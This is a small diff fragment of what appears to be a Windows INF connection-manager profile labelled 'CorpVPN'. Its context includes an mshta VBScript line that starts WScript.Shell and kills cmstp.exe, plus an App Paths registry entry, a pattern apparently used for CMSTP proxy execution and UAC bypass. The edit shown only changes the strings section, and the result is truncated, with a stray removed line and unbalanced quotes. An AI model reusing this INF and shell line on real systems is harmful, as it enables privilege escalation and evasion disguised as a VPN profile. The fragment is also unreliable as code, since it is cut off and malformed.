@@ -103,5 +103,4 @@ mshta vbscript:Execute(""CreateObject('WScript.Shell').Run 'taskkill /IM cmstp.e
 HKLM, SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE, ProfileInstallPath, %UnexpectedError%
 
 [Strings]
-ServiceName=""CorpVPN""
-S
+ServiceName=""CorpVPN"
